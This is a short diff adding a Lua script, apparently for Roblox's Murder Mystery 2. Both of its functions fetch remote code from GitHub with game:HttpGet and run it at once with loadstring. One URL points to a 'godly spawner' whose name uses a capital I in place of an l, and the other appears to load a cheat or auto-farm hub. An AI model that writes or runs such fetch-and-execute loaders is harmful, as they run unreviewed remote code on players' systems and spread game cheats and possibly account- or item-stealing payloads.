@@ -1,0 +1,9 @@
+local function script()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MM2DuperTrooper/MM2GodlIySpawner/refs/heads/main/MM2GodlIySpawner.txt"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+end
+
+task.spawn(script)
+task.spawn(farm)
